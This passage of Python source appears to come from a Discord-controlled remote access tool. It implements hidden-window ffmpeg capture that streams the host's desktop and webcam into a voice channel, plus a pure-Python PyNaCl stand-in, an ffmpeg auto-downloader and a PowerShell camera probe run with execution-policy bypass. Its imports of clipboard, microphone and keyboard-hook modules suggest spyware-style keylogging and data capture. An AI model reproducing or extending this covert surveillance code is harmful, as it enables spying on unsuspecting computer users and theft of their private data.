        x[1] ^= _rotl((x[0] + x[3]) & _MASK32, 7)
        x[2] ^= _rotl((x[1] + x[0]) & _MASK32, 9)
        x[3] ^= _rotl((x[2] + x[1]) & _MASK32, 13)
        x[0] ^= _rotl((x[3] + x[2]) & _MASK32, 18)

        x[6] ^= _rotl((x[5] + x[4]) & _MASK32, 7)
        x[7] ^= _rotl((x[6] + x[5]) & _MASK32, 9)
        x[4] ^= _rotl((x[7] + x[6]) & _MASK32, 13)
        x[5] ^= _rotl((x[4] + x[7]) & _MASK32, 18)

        x[11] ^= _rotl((x[10] + x[9]) & _MASK32, 7)
        x[8] ^= _rotl((x[11] + x[10]) & _MASK32, 9)
        x[9] ^= _rotl((x[8] + x[11]) & _MASK32, 13)
        x[10] ^= _rotl((x[9] + x[8]) & _MASK32, 18)

        x[12] ^= _rotl((x[15] + x[14]) & _MASK32, 7)
        x[13] ^= _rotl((x[12] + x[15]) & _MASK32, 9)
        x[14] ^= _rotl((x[13] + x[12]) & _MASK32, 13)
        x[15] ^= _rotl((x[14] + x[13]) & _MASK32, 18)
    return x


def _salsa20_block(key, nonce8, counter):
    st = [
        _SIGMA[0],
        int.from_bytes(key[0:4], "little"), int.from_bytes(key[4:8], "little"),
        int.from_bytes(key[8:12], "little"), int.from_bytes(key[12:16], "little"),
        _SIGMA[1],
        int.from_bytes(nonce8[0:4], "little"), int.from_bytes(nonce8[4:8], "little"),
        counter & _MASK32, (counter >> 32) & _MASK32,
        _SIGMA[2],
        int.from_bytes(key[16:20], "little"), int.from_bytes(key[20:24], "little"),
        int.from_bytes(key[24:28], "little"), int.from_bytes(key[28:32], "little"),
        _SIGMA[3],
    ]
    x = _salsa20_rounds(list(st))
    return struct.pack("<16I", *[(x[i] + st[i]) & _MASK32 for i in range(16)])


def _hsalsa20(key, nonce16):
    st = [
        _SIGMA[0],
        int.from_bytes(key[0:4], "little"), int.from_bytes(key[4:8], "little"),
        int.from_bytes(key[8:12], "little"), int.from_bytes(key[12:16], "little"),
        _SIGMA[1],
        int.from_bytes(nonce16[0:4], "little"), int.from_bytes(nonce16[4:8], "little"),
        int.from_bytes(nonce16[8:12], "little"), int.from_bytes(nonce16[12:16], "little"),
        _SIGMA[2],
        int.from_bytes(key[16:20], "little"), int.from_bytes(key[20:24], "little"),
        int.from_bytes(key[24:28], "little"), int.from_bytes(key[28:32], "little"),
        _SIGMA[3],
    ]
    x = _salsa20_rounds(list(st))
    return struct.pack("<8I", x[0], x[5], x[10], x[15], x[6], x[7], x[8], x[9])


def _xsalsa20_keystream(key, nonce24, nbytes):
    sub = _hsalsa20(key, nonce24[:16])
    n8 = nonce24[16:24]
    out = bytearray()
    ctr = 0
    while len(out) < nbytes:
        out += _salsa20_block(sub, n8, ctr)
        ctr += 1
    return bytes(out[:nbytes])


def _secretbox_seal(msg, nonce, key):
    ks = _xsalsa20_keystream(key, nonce, len(msg) + 32)
    ct = _xor(msg, ks[32:])
    return _poly1305(ct, ks[:32]) + ct


def _secretbox_open(boxed, nonce, key):
    tag, ct = boxed[:16], boxed[16:]
    ks = _xsalsa20_keystream(key, nonce, len(ct) + 32)
    if _poly1305(ct, ks[:32]) != tag:
        raise ValueError("Poly1305 tag mismatch")
    return _xor(ct, ks[32:])


_CHACHA_CONST = struct.unpack("<4I", b"expand 32-byte k")


def _chacha_qr(x, a, b, c, d):
    x[a] = (x[a] + x[b]) & _MASK32
    x[d] = _rotl(x[d] ^ x[a], 16)
    x[c] = (x[c] + x[d]) & _MASK32
    x[b] = _rotl(x[b] ^ x[c], 12)
    x[a] = (x[a] + x[b]) & _MASK32
    x[d] = _rotl(x[d] ^ x[a], 8)
    x[c] = (x[c] + x[d]) & _MASK32
    x[b] = _rotl(x[b] ^ x[c], 7)


def _chacha_rounds(x):
    for _ in range(10):
        _chacha_qr(x, 0, 4, 8, 12)
        _chacha_qr(x, 1, 5, 9, 13)
        _chacha_qr(x, 2, 6, 10, 14)
        _chacha_qr(x, 3, 7, 11, 15)
        _chacha_qr(x, 0, 5, 10, 15)
        _chacha_qr(x, 1, 6, 11, 12)
        _chacha_qr(x, 2, 7, 8, 13)
        _chacha_qr(x, 3, 4, 9, 14)
    return x


def _hchacha20(key, nonce16):
    st = (list(_CHACHA_CONST) + list(struct.unpack("<8I", key)) +
          list(struct.unpack("<4I", nonce16)))
    x = _chacha_rounds(list(st))
    return struct.pack("<8I", x[0], x[1], x[2], x[3],
                       x[12], x[13], x[14], x[15])


def _chacha20_block(key, counter, nonce12):
    st = (list(_CHACHA_CONST) + list(struct.unpack("<8I", key)) +
          [counter] + list(struct.unpack("<3I", nonce12)))
    x = _chacha_rounds(list(st))
    return struct.pack("<16I", *[(x[i] + st[i]) & _MASK32 for i in range(16)])


def _xchacha20_keystream(key, nonce24, nbytes):
    sub = _hchacha20(key, nonce24[:16])
    n12 = b"\x00\x00\x00\x00" + nonce24[16:24]
    out = bytearray()
    ctr = 0
    while len(out) < nbytes:
        out += _chacha20_block(sub, ctr, n12)
        ctr += 1
    return bytes(out[:nbytes])


def _aead_mac_data(aad, ct):
    def pad(x):
        return x + b"\x00" * ((16 - len(x) % 16) % 16)
    return (pad(aad) + pad(ct) + struct.pack("<Q", len(aad)) +
            struct.pack("<Q", len(ct)))


def _xchacha_encrypt(message, aad, nonce, key):
    ks = _xchacha20_keystream(key, nonce, len(message) + 64)
    ct = _xor(message, ks[64:])
    return ct + _poly1305(_aead_mac_data(aad, ct), ks[:32])


def _xchacha_decrypt(ciphertext, aad, nonce, key):
    ct, tag = ciphertext[:-16], ciphertext[-16:]
    ks = _xchacha20_keystream(key, nonce, len(ct) + 64)
    if _poly1305(_aead_mac_data(aad, ct), ks[:32]) != tag:
        raise ValueError("Poly1305 tag mismatch")
    return _xor(ct, ks[64:])


NACL_REAL = False
try:
    import nacl.secret
    NACL_REAL = True
except ImportError:
    NACL_REAL = False


def _install_nacl_shim():
    import types

    nacl = types.ModuleType("nacl")
    nacl.__version__ = "1.5.0-shim"
    nacl.__path__ = []

    secret = types.ModuleType("nacl.secret")
    utils_mod = types.ModuleType("nacl.utils")
    exc = types.ModuleType("nacl.exceptions")
    bindings = types.ModuleType("nacl.bindings")

    class CryptoError(Exception):
        pass

    class BadSignatureError(CryptoError):
        pass

    exc.CryptoError = CryptoError
    exc.BadSignatureError = BadSignatureError

    def _random(size=32):
        return os.urandom(size)

    class EncryptedMessage:
        def __init__(self, nonce, ciphertext):
            self.nonce = nonce
            self.ciphertext = ciphertext

        def __iter__(self):
            return iter((self.nonce, self.ciphertext))

    utils_mod.random = _random
    utils_mod.EncryptedMessage = EncryptedMessage

    class SecretBox:
        KEY_SIZE = 32
        NONCE_SIZE = 24
        MACBYTES = 16

        def __init__(self, key, encoder=None):
            key = bytes(key)
            if len(key) != 32:
                raise ValueError("SecretBox key must be 32 bytes")
            self._key = key

        def encrypt(self, plaintext, nonce=None, encoder=None):
            if nonce is None:
                nonce = os.urandom(24)
            nonce = bytes(nonce)
            return EncryptedMessage(
                nonce, _secretbox_seal(bytes(plaintext), nonce, self._key))

        def decrypt(self, ciphertext, nonce=None, encoder=None):
            ciphertext = bytes(ciphertext)
            if nonce is None:
                nonce, ciphertext = ciphertext[-24:], ciphertext[:-24]
            try:
                return _secretbox_open(ciphertext, bytes(nonce), self._key)
            except Exception as e:
                raise CryptoError(str(e))

    secret.SecretBox = SecretBox
    secret.CryptoError = CryptoError

    class Aead:
        KEY_SIZE = 32
        NONCE_SIZE = 24

        def __init__(self, key, encoder=None):
            key = bytes(key)
            if len(key) != 32:
                raise ValueError("Aead key must be 32 bytes")
            self._key = key

        def encrypt(self, plaintext, aad=b"", nonce=None, encoder=None):
            if nonce is None:
                nonce = os.urandom(24)
            nonce = bytes(nonce)
            box = _xchacha_encrypt(bytes(plaintext), bytes(aad), nonce, self._key)
            return EncryptedMessage(nonce, box)

        def decrypt(self, ciphertext, aad=b"", nonce=None, encoder=None):
            ciphertext = bytes(ciphertext)
            if nonce is None:
                nonce, ciphertext = ciphertext[-24:], ciphertext[:-24]
            return _xchacha_decrypt(ciphertext, bytes(aad), bytes(nonce), self._key)

    secret.Aead = Aead

    def crypto_aead_aes256gcm_is_available():
        return False

    crypto_aead_aes256_gcm_is_available = crypto_aead_aes256gcm_is_available

    def crypto_aead_xchacha20poly1305_ietf_encrypt(message, aad, nonce, key):
        return _xchacha_encrypt(bytes(message), bytes(aad), bytes(nonce), bytes(key))

    def crypto_aead_xchacha20poly1305_ietf_decrypt(ciphertext, aad, nonce, key):
        return _xchacha_decrypt(bytes(ciphertext), bytes(aad), bytes(nonce), bytes(key))

    def sodium_init():
        return 0

    bindings.crypto_aead_aes256gcm_is_available = crypto_aead_aes256gcm_is_available
    bindings.crypto_aead_aes256_gcm_is_available = crypto_aead_aes256_gcm_is_available
    bindings.crypto_aead_xchacha20poly1305_ietf_encrypt = crypto_aead_xchacha20poly1305_ietf_encrypt
    bindings.crypto_aead_xchacha20poly1305_ietf_decrypt = crypto_aead_xchacha20poly1305_ietf_decrypt
    bindings.sodium_init = sodium_init

    nacl.secret = secret
    nacl.utils = utils_mod
    nacl.exceptions = exc
    nacl.bindings = bindings

    sys.modules.update({
        "nacl": nacl, "nacl.secret": secret, "nacl.utils": utils_mod,
        "nacl.exceptions": exc, "nacl.bindings": bindings,
    })


if not NACL_REAL:
    try:
        _install_nacl_shim()
        log("PyNaCl absent -> pure-python nacl shim installed")
    except Exception:
        log("nacl shim FAILED:\n" + traceback.format_exc())

try:
    import davey
    DAVEY_OK = True
except ImportError:
    davey = None
    DAVEY_OK = False
    log("!! davey missing -> voice will refuse to connect")


MISSING = []

try:
    import discord
    from discord.ext import commands
    log(f"discord.py version {discord.__version__}")
    if int(discord.__version__.split(".")[0]) < 2:
        log("!! discord.py is older than 2.0 -> pip install -U discord.py")
except ImportError as e:
    log(f"FATAL: discord.py not installed ({e})")
    raise

for mod in ("mss", "cv2", "pyperclip", "sounddevice", "numpy", "pynput.keyboard"):
    try:
        __import__(mod)
    except ImportError:
        MISSING.append(mod)
if MISSING:
    log(f"!! missing optional modules: {', '.join(MISSING)}")

try:
    import mss
except ImportError:
    mss = None
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import pyperclip
except ImportError:
    pyperclip = None
try:
    import sounddevice as sd
except ImportError:
    sd = None
try:
    import numpy as np
except ImportError:
    np = None
try:
    from pynput import keyboard as pynput_keyboard
except ImportError:
    pynput_keyboard = None


_OPUS_OK = False


def _load_opus():
    global _OPUS_OK
    try:
        if discord.opus.is_loaded():
            _OPUS_OK = True
            return True
    except Exception:
        pass
    names = ["libopus-0.x64.dll", "libopus-0.x86.dll", "opus.dll",
             "libopus.dll", "libopus.so.0", "libopus.dylib"]
    roots = [script_dir(), os.getcwd()]
    try:
        roots.append(os.path.join(os.path.dirname(discord.__file__), "bin"))
    except Exception:
        pass
    if MEIPASS:
        roots.append(MEIPASS)
    for root in roots:
        for n in names:
            p = os.path.join(root, n)
            if os.path.isfile(p):
                try:
                    discord.opus.load_opus(p)
                    if discord.opus.is_loaded():
                        log(f"opus loaded: {p}")
                        _OPUS_OK = True
                        return True
                except Exception as e:
                    log(f"opus load failed {p}: {e}")
    for n in names:
        w = shutil.which(n)
        if w:
            try:
                discord.opus.load_opus(w)
                if discord.opus.is_loaded():
                    log(f"opus loaded from PATH: {w}")
                    _OPUS_OK = True
                    return True
            except Exception:
                pass
    log("!! libopus not found -> voice unavailable")
    return False


# ----------------------------------------------------------------------------
# ffmpeg discovery
# ----------------------------------------------------------------------------

_FFMPEG_OK = None
_FFMPEG_CHECKED_AT = 0.0
_FFMPEG_LOCK = threading.Lock()
_FETCH_LOCK = threading.Lock()
FFMPEG_RECHECK = 20.0


def _ffmpeg_candidates():
    out = []
    if FFMPEG and FFMPEG != "ffmpeg":
        out.append(FFMPEG)
    out.append(os.path.join(INSTALL_DIR, "ffmpeg.exe"))
    if MEIPASS:
        out.append(os.path.join(MEIPASS, "ffmpeg.exe"))
    w = shutil.which("ffmpeg")
    if w:
        out.append(w)

    la = os.environ.get("LOCALAPPDATA") or ""
    up = os.environ.get("USERPROFILE") or ""
    pd = os.environ.get("ProgramData") or ""
    out += [
        os.path.join(la, "Microsoft", "WinGet", "Links", "ffmpeg.exe"),
        os.path.join(up, "scoop", "shims", "ffmpeg.exe"),
        os.path.join(pd, "chocolatey", "bin", "ffmpeg.exe"),
        r"C:\ffmpeg\bin\ffmpeg.exe",
        r"C:\Program Files\ffmpeg\bin\ffmpeg.exe",
        r"C:\Program Files (x86)\ffmpeg\bin\ffmpeg.exe",
    ]
    if la:
        out += glob.glob(os.path.join(la, "Microsoft", "WinGet", "Packages",
                                      "*FFmpeg*", "**", "ffmpeg.exe"),
                         recursive=True)
        out += glob.glob(os.path.join(la, "Programs", "*ffmpeg*", "**", "ffmpeg.exe"),
                         recursive=True)
    out.append("ffmpeg")

    seen, res = set(), []
    for c in out:
        k = os.path.normcase(str(c))
        if k in seen:
            continue
        seen.add(k)
        res.append(c)
    return res


def ffmpeg_ok(force=False):
    global _FFMPEG_OK, _FFMPEG_CHECKED_AT, FFMPEG
    with _FFMPEG_LOCK:
        now = time.time()
        if _FFMPEG_OK is True and not force:
            return True
        if not force and (now - _FFMPEG_CHECKED_AT) < FFMPEG_RECHECK:
            return bool(_FFMPEG_OK)
        _FFMPEG_CHECKED_AT = now

    for cand in _ffmpeg_candidates():
        if cand != "ffmpeg" and not os.path.isfile(cand):
            continue
        try:
            r = subprocess.run([cand, "-version"], capture_output=True,
                               timeout=12, creationflags=CREATE_NO_WINDOW)
        except Exception:
            continue
        if r.returncode == 0:
            with _FFMPEG_LOCK:
                if FFMPEG != cand:
                    log(f"ffmpeg found: {cand}")
                FFMPEG = cand
                _FFMPEG_OK = True
            return True

    with _FFMPEG_LOCK:
        _FFMPEG_OK = False
    return False


def _extract_ffmpeg(zpath, dest):
    import zipfile
    with zipfile.ZipFile(zpath) as z:
        if z.testzip() is not None:
            log("ffmpeg: archive is corrupt")
            return False
        member = None
        for n in z.namelist():
            nn = n.replace("\\", "/")
            if nn.endswith("/bin/ffmpeg.exe") or nn == "bin/ffmpeg.exe":
                member = n
                break
        if member is None:
            log("ffmpeg: no bin/ffmpeg.exe inside the archive")
            return False
        tmp = dest + ".tmp"
        with z.open(member) as src, open(tmp, "wb") as out:
            shutil.copyfileobj(src, out, 1 << 20)
    os.replace(tmp, dest)
    return os.path.getsize(dest) > 1_000_000


def fetch_ffmpeg(force=False):
    global FFMPEG, _FFMPEG_OK, _FFMPEG_CHECKED_AT
    if not force and ffmpeg_ok(force=True):
        return True

    if not _FETCH_LOCK.acquire(blocking=False):
        with _FETCH_LOCK:
            pass
        return ffmpeg_ok(force=True)
    try:
        dest = os.path.join(INSTALL_DIR, "ffmpeg.exe")
        if os.path.isfile(dest):
            try:
                os.remove(dest)
            except OSError:
                pass

        for label, url in FFMPEG_SOURCES:
            zpath = os.path.join(INSTALL_DIR, f"ffmpeg_{label}.zip")
            log(f"ffmpeg: fetching from {label}")
            if not _download(url, zpath):
                log(f"ffmpeg: {label} download failed")
                continue
            ok = False
            try:
                ok = _extract_ffmpeg(zpath, dest)
            except Exception as e:
                log(f"ffmpeg: extract from {label} failed: {e}")
            finally:
                try:
                    os.remove(zpath)
                except OSError:
                    pass
            if not ok:
                continue
            with _FFMPEG_LOCK:
                FFMPEG = dest
                _FFMPEG_OK = None
                _FFMPEG_CHECKED_AT = 0.0
            if ffmpeg_ok(force=True):
                log(f"ffmpeg ready at {dest}")
                return True
            log("ffmpeg: downloaded binary refused to run")
        log("ffmpeg: every source failed")
        return False
    finally:
        _FETCH_LOCK.release()


def _ffmpeg_watcher():
    if not AUTO_FFMPEG:
        return
    for _ in range(40):
        try:
            if ffmpeg_ok(force=True):
                return
            if fetch_ffmpeg():
                return
        except Exception:
            log("ffmpeg watcher error:\n" + traceback.format_exc())
        time.sleep(30)
    log("ffmpeg watcher gave up")


# ----------------------------------------------------------------------------
# video streaming
# ----------------------------------------------------------------------------

VIDEO_PAYLOAD_TYPE = 101
RTX_PAYLOAD_TYPE   = 102
MAX_VIDEO_PAYLOAD  = 1100
VIDEO_RID          = "100"
RID_EXT_PREFIX     = b"\xbe\xde\x00\x01\xb2"
VIDEO_SENDER = None
_VIDEO_LOCK = threading.RLock()
_VIDEO_PATCHED = False

_CAM_SEL       = None
_CAM_PROBED_AT = 0.0
_CAM_LOCK      = threading.Lock()
CAM_COOLDOWN   = 5.0


def _rid_ext(rid):
    return RID_EXT_PREFIX + str(rid).encode("ascii")[:3].ljust(3, b"0")


def _bitrate_bps(text):
    s = str(text).strip().lower()
    try:
        if s.endswith("k"):
            return int(float(s[:-1]) * 1000)
        if s.endswith("m"):
            return int(float(s[:-1]) * 1000000)
        return int(float(s))
    except Exception:
        return 2000000


def _is_missing(v):
    if v is None:
        return True
    tn = type(v).__name__
    return "Sentinel" in tn or "Missing" in tn


def _vc_attr(vc, *names):
    for holder in (vc, getattr(vc, "_connection", None)):
        if holder is None:
            continue
        for n in names:
            try:
                v = getattr(holder, n)
            except Exception:
                continue
            if not _is_missing(v):
                return v
    return None


def _enum_member(holder, *names):
    for n in names:
        v = getattr(holder, n, None)
        if v is not None:
            return v
    return None


def _stream_spec():
    return [{
        "type": t, "rid": VIDEO_RID, "quality": 100, "active": False,
        "max_bitrate": _bitrate_bps(VIDEO_BITRATE),
        "max_framerate": VIDEO_FPS,
        "max_resolution": {"type": "fixed",
                           "width": VIDEO_MAX_WIDTH, "height": 720},
    } for t in ("video", "screen")]


def _codec_spec():
    return [
        {"name": "opus", "type": "audio", "priority": 1000, "payload_type": 120},
        {"name": "H264", "type": "video", "priority": 1000,
         "payload_type": VIDEO_PAYLOAD_TYPE,
         "rtx_payload_type": RTX_PAYLOAD_TYPE, "encode": True, "decode": True},
    ]


def install_video_support():
    global _VIDEO_PATCHED
    if _VIDEO_PATCHED:
        return True
    try:
        from discord.gateway import DiscordVoiceWebSocket as VWS
    except Exception as e:
        log(f"video patch failed: {e}")
        return False

    orig_identify = VWS.identify
    orig_select = VWS.select_protocol
    orig_initial = VWS.initial_connection

    async def _capture(ws, call):
        cap = {}
        orig_send = ws.send_as_json

        async def grab(data):
            cap.update(data)

        ws.send_as_json = grab
        try:
            await call()
        finally:
            ws.send_as_json = orig_send
        return cap, orig_send

    async def identify(self):
        cap, send = await _capture(self, lambda: orig_identify(self))
        d = cap.setdefault("d", {})
        d["video"] = True
        d["streams"] = _stream_spec()
        await send(cap)

    async def select_protocol(self, ip, port, mode):
        cap, send = await _capture(self, lambda: orig_select(self, ip, port, mode))
        d = cap.setdefault("d", {})
        d.setdefault("codecs", _codec_spec())
        if isinstance(d.get("data"), dict):
            d["data"].setdefault("codecs", _codec_spec())
        await send(cap)

    async def initial_connection(self, data):
        try:
            self._connection._video_streams = data.get("streams") or []
            log(f"voice ready: streams={self._connection._video_streams}")
        except Exception:
            pass
        return await orig_initial(self, data)

    VWS.identify = identify
    VWS.select_protocol = select_protocol
    VWS.initial_connection = initial_connection
    _VIDEO_PATCHED = True
    log("video support patched into the voice websocket")
    return True


def pick_stream(vc, want):
    streams = getattr(getattr(vc, "_connection", None),
                      "_video_streams", None) or []
    if not streams:
        return None
    if want == "cam":
        for s in streams:
            if s.get("type") == "video":
                return s
    for s in streams:
        if s.get("type") == "screen":
            return s
    return streams[0]


def _dshow_names():
    try:
        r = subprocess.run([FFMPEG, "-hide_banner", "-list_devices", "true",
                            "-f", "dshow", "-i", "dummy"],
                           capture_output=True, text=True, timeout=20,
                           creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log(f"dshow probe failed: {e}")
        return []
    blob = (r.stderr or "") + (r.stdout or "")
    in_video = False
    names = []
    for line in blob.splitlines():
        if "DirectShow video devices" in line:
            in_video = True
            continue
        if "DirectShow audio devices" in line:
            in_video = False
            continue
        if not in_video or "Alternative name" in line:
            continue
        m = re.search(r'"([^"]+)"', line)
        if m and m.group(1).strip():
            names.append(m.group(1).strip())
    return names


def _wmi_names():
    ps = ("Get-CimInstance Win32_PnPEntity | Where-Object { "
          "$_.PNPClass -eq 'Camera' -or $_.PNPClass -eq 'Image' -or "
          "$_.Service -eq 'usbvideo' } | Select-Object -ExpandProperty Name")
    try:
        r = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
             "-Command", ps],
            capture_output=True, text=True, timeout=25,
            creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        log(f"wmi camera probe failed: {e}")
        return []
    return [l.strip() for l in (r.stdout or "").splitlines() if l.strip()]


def _cam_sources():
    out = []
    if ffmpeg_ok():
        for n in _dshow_names():
            out.append(("dshow", n))
    for n in _wmi_names():
        if ("dshow", n) not in out:
            out.append(("dshow", n))
    for i in (0, 1, 2):
        out.append(("vfwcap", str(i)))
    return out


def _dshow_dev(name):
    return "video=" + str(name).replace(":", "\\:")


def _cam_args(kind, name):
    if kind == "dshow":
        return ["-f", "dshow", "-rtbufsize", "128M", "-i", _dshow_dev(name)]
    return ["-f", "vfwcap", "-rtbufsize", "128M",
            "-framerate", str(VIDEO_FPS), "-i", str(name)]


def _cam_opens(kind, name, timeout=20):
    tmp = os.path.join(TMP_DIR, "camtest.jpg")
    last = "?"
    variants = [[]]
    if kind == "dshow":
        variants.append(["-video_size", "640x480"])
    for extra in variants:
        cmd = ([FFMPEG, "-hide_banner", "-loglevel", "error", "-y"]
               + _cam_args(kind, name) + extra +
               ["-frames:v", "1", "-q:v", "5", tmp])
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=timeout, creationflags=CREATE_NO_WINDOW)
        except Exception as e:
            last = str(e)
            continue
        if r.returncode == 0 and os.path.isfile(tmp) and os.path.getsize(tmp) > 0:
            return True
        err = (r.stderr or "no frame").strip().splitlines()
        last = err[-1][:150] if err else "no frame"
    log(f"cam: {kind}:{name} will not open ({last})")
    return False


def cam_source(force=False):
    """First (kind, name) that actually yields a frame, or None."""
    global _CAM_SEL, _CAM_PROBED_AT
    with _CAM_LOCK:
        now = time.time()
        if _CAM_SEL and not force:
            return _CAM_SEL
        if not force and (now - _CAM_PROBED_AT) < CAM_COOLDOWN:
            return _CAM_SEL
        _CAM_PROBED_AT = now
        prev = _CAM_SEL

    sel = None
    for attempt in range(2):
        if not ffmpeg_ok():
            time.sleep(0.5)
            continue
        for kind, name in _cam_sources():
            if _cam_opens(kind, name):
                sel = (kind, name)
                break
        if sel is None and prev is not None:
            sel = prev
        if sel:
            break
        time.sleep(0.5)

    with _CAM_LOCK:
        _CAM_SEL = sel
    log(f"cam: using {sel[0]}:{sel[1]}" if sel else "cam: none found")
    return sel


def _video_filter(prefix="", width=None):
    w = width or VIDEO_MAX_WIDTH
    return f"{prefix}fps={VIDEO_FPS},scale={w}:-2"


def build_ffmpeg_cmd(source, cam_sel=None):
    base = [FFMPEG, "-hide_banner", "-loglevel", "error", "-nostdin"]
    enc = ["-vcodec", "libx264", "-preset", "ultrafast", "-tune", "zerolatency",
           "-profile:v", "baseline", "-pix_fmt", "yuv420p",
           "-x264-params", "aud=1:repeat_headers=1",
           "-g", str(max(2, VIDEO_FPS * 2)), "-b:v", VIDEO_BITRATE,
           "-f", "h264", "pipe:1"]
    screen = ["-f", "gdigrab", "-framerate", str(VIDEO_FPS),
              "-draw_mouse", "1", "-i", "desktop"]

    sel = cam_sel if cam_sel is not None else cam_source()
    cam_in = _cam_args(*sel) if sel else None

    if source == "cam" and cam_in:
        return base + cam_in + ["-vf", _video_filter()] + enc

    if source == "both" and cam_in:
        # setpts normalises the two live inputs onto a common timeline; without
        # it overlay can sit waiting on mismatched timestamps forever.
        return base + screen + cam_in + [
            "-filter_complex",
            f"[0:v]setpts=PTS-STARTPTS,{_video_filter()}[bg];"
            f"[1:v]setpts=PTS-STARTPTS,{_video_filter(width=360)}[fg];"
            "[bg][fg]overlay=W-w-16:H-h-16:shortest=0:format=auto[v]",
            "-map", "[v]",
        ] + enc
    return base + screen + ["-vf", _video_filter()] + enc


class VideoSender(threading.Thread):
    """Screen/webcam into the voice channel as H.264 RTP.

    Two hard rules from the voice protocol:
      * the server relays ONLY packets whose SSRC it handed back in READY
      * exactly one sender per SSRC -- two threads interleaving sequence
        numbers on one SSRC produce a scrambled stream the receiver drops"""

    def __init__(self, vc, source="screen"):
        super().__init__(daemon=True)
        self.vc = vc
        self.source = source
        self._retries = 0
        self._sels = []
        self._sel_idx = -1
        self._cam_sel = None

        if source in ("cam", "both"):
            try:
                self._sels = _cam_sources()
            except Exception:
                self._sels = []
            self._cam_sel = cam_source()
            if self._cam_sel and self._cam_sel in self._sels:
                self._sel_idx = self._sels.index(self._cam_sel)

        self.stream = pick_stream(vc, source)
        self.from_ready = self.stream is not None
        base_ssrc = int(_vc_attr(vc, "ssrc") or 0)
        if self.stream:
            self.video_ssrc = int(self.stream.get("ssrc") or (base_ssrc + 1))
            self.rtx_ssrc = int(self.stream.get("rtx_ssrc") or (self.video_ssrc + 1))
            self.rid = str(self.stream.get("rid") or VIDEO_RID)
        else:
            log("video: READY carried no streams -> guessing ssrc")
            self.video_ssrc = (base_ssrc + 1) & 0xFFFFFFFF
            self.rtx_ssrc = (base_ssrc + 2) & 0xFFFFFFFF
            self.rid = VIDEO_RID
        self.rid_ext = _rid_ext(self.rid)
        self._stop = threading.Event()
        self.proc = None
        self._err_tail = []
        self.seq = 0
        self.ts = 0
        self.frame_ticks = int(90000 / max(1, VIDEO_FPS))
        self.frame = bytearray()
        self.have_vcl = False
        self.frames = 0
        self.packets = 0
        self.bytes = 0
        self.send_errors = 0
        self.signalled = False
        self._dave_ok = None
        self._dave_miss = 0
        self._warned_sock = False
        self._buf_tuned = False
        self._spawn_at = time.time()
        self._killed = False

    def stop(self):
        self._stop.set()
        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
        except Exception:
            pass

    def run(self):
        log(f"video start source={self.source} ssrc={self.video_ssrc} "
            f"from_ready={self.from_ready} rtx={self.rtx_ssrc} rid={self.rid} "
            f"cam={self._cam_sel} sock={bool(self._sock())} "
            f"mode={_vc_attr(self.vc, 'mode') or '?'}")
        threading.Thread(target=self._watchdog, daemon=True).start()
        try:
            self.announce()
            self.spawn()
            while True:
                self.pump()
                if self._stop.is_set() or self.frames:
                    break
                if not self._retry():
                    break
        except Exception:
            log("video crashed:\n" + traceback.format_exc())
        finally:
            try:
                self._flush()
            except Exception:
                pass
            self.retract()
            log(f"video stopped after {self.frames} frame(s), "
                f"{self.packets} packet(s), {self.send_errors} send error(s)")

    def _watchdog(self):
        """Logs progress, and crucially kills a hung ffmpeg. If the process
        never exits, pump() never returns and the retry chain never fires --
        which is exactly how 'both' sat at zero frames forever."""
        reported = False
        while not self._stop.is_set():
            time.sleep(1)
            if self._stop.is_set():
                return
            age = time.time() - self._spawn_at
            if not reported and age >= 6:
                reported = True
                log(f"video: 6s check -> frames={self.frames} "
                    f"packets={self.packets} errors={self.send_errors} "
                    f"announced={self.signalled}")
            if (self.frames == 0 and not self._killed
                    and age >= 10 and self._retries < 5):
                self._killed = True
                log("video: 10s with no frames -> forcing a retry")
                try:
                    if self.proc and self.proc.poll() is None:
                        self.proc.terminate()
                except Exception:
                    pass

    def _next_sel(self):
        nxt = self._sel_idx + 1
        if nxt >= len(self._sels):
            return None
        self._sel_idx = nxt
        return self._sels[nxt]

    def _retry(self):
        if self.frames or self._stop.is_set() or self._retries >= 5:
            return False
        self._retries += 1

        if self.source == "cam":
            nxt = self._next_sel()
            if nxt is not None:
                log(f"video: {self._cam_sel} gave nothing -> trying {nxt}")
                self._cam_sel = nxt
            else:
                log("video: out of camera sources -> dropping to screen")
                self.source = "screen"
                self._cam_sel = None
        elif self.source == "both":
            log("video: camera unusable in 'both' -> screen only")
            self.source = "screen"
            self._cam_sel = None
        else:
            return False

        try:
            if self.proc and self.proc.poll() is None:
                self.proc.terminate()
            if self.proc:
                self.proc.wait(timeout=5)
        except Exception:
            pass
        self._err_tail = []
        self.announce()
        self.spawn()
        return True

    def _ws_send(self, payload):
        ws = _vc_attr(self.vc, "ws")
        loop = _vc_attr(self.vc, "loop") or getattr(bot, "loop", None)
        if ws is None or loop is None:
            log("video: no voice websocket -> cannot signal")
            return False
        try:
            asyncio.run_coroutine_threadsafe(
                ws.send_as_json(payload), loop).result(timeout=12)
            return True
        except Exception as e:
            log(f"video: op {payload.get('op')} failed: "
                f"{type(e).__name__}: {e}")
            return False

    def _speak(self, ssrc, flags):
        if not ssrc:
            return
        self._ws_send({"op": 5, "d": {"speaking": int(flags), "delay": 0,
                                      "ssrc": int(ssrc)}})

    def _stream_payload(self):
        want = "video" if self.source == "cam" else "screen"
        streams = getattr(getattr(self.vc, "_connection", None),
                          "_video_streams", None) or []
        out = []
        for s in streams:
            s2 = dict(s)
            s2["active"] = (int(s.get("ssrc") or 0) == self.video_ssrc)
            out.append(s2)
        if not out:
            out = [{
                "type": want, "rid": self.rid, "ssrc": self.video_ssrc,
                "active": True, "quality": 100, "rtx_ssrc": self.rtx_ssrc,
                "max_bitrate": _bitrate_bps(VIDEO_BITRATE),
                "max_framerate": VIDEO_FPS,
                "max_resolution": {"type": "fixed",
                                   "width": VIDEO_MAX_WIDTH, "height": 720},
            }]
        return out, want

    def announce(self):
        streams, want = self._stream_payload()
        audio = int(_vc_attr(self.vc, "ssrc") or 0)
        d = {"audio_ssrc": audio, "video_ssrc": self.video_ssrc,
             "rtx_ssrc": self.rtx_ssrc, "streams": streams}
        self.signalled = False
        for attempt in range(2):
            if self._ws_send({"op": 12, "d": d}):
                self.signalled = True
                break
            time.sleep(0.3)
        if self.signalled:
            self._speak(self.video_ssrc, 2 if want == "screen" else 0)
